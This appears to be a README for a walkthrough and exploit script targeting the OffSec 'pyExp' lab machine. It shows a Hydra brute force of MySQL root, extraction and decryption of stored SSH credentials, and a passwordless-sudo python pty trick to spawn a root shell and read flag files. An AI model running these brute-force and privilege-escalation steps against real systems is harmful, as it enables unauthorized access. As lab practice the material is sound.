# Offsec-pyExp

```
Usage : python3 resolv-pyExp.py -i 192.168.182.118 -p 3306 -w /usr/share/wordlists/rockyou.txt
```

Specific Steps for pyExp

Reconnaissance: Scan to identify running services, particularly MySQL (tcp/3306) and SSH (tcp/1337).

Brute Force MySQL: Use Hydra to brute force MySQL access using the wordlist /usr/share/wordlist/rockyou.txt.

```bash
hydra -l root -P /usr/share/wordlist/rockyou.txt mysql://<IP_ADDRESS>:3306
```
Database Access: Extract the encrypted SSH credentials via the symmetric Fernet algorithm from the `data` table.

SSH Connection: Decrypt the credentials and connect via SSH on tcp/1337.

```bash
ssh <user>@<IP_ADDRESS> -p 1337
```
Privilege Escalation: The user 'lucy' can execute a script with root privileges without a password. Use it for privilege escalation.

```bash
sudo /usr/bin/python2 /opt/exp.py
import pty;pty.spawn("/bin/bash")
```

Flag Retrieval: Read the local.txt and proof.txt files after privilege escalation.

```bash
cat local.txt
cat /root/proof.txt
```
![offsec-pyExp](https://github.com/Isid0r3/Offsec-pyExp/assets/120736091/bcdb484c-c3d6-4a53-8827-6033e084aa6d)

Credits : Isid0r3 & Jedidia
